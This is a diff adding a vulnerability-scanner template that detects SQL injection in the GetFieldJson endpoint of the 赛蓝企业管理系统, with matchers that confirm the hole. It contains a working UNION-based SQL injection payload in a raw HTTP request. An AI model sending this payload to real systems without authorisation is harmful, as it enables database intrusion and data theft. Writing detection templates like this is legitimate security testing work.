@@ -1,0 +1,27 @@
+id: enterprise-management-system-getfieldjson-sqli
+info:
+  name: 赛蓝企业管理系统 GetFieldJson SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The endpoint `/BaseModule/ExcelImport/GetFieldJson` in the 赛蓝企业管理系统 is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+http:
+  - raw:
+      - |
+        GET /BaseModule/ExcelImport/GetFieldJson?tableCode=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2881%29%2BCHAR%28119%29%2BCHAR%2888%29%2BCHAR%2899%29%2BCHAR%2865%29%2BCHAR%28108%29%2BCHAR%28115%29%2BCHAR%2881%29%2BCHAR%2886%29%2BCHAR%2884%29%2CNULL--+cqNB HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qpzkqQwXcAlsQVT"
+          - '"id":""'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: status
+        status: [200]
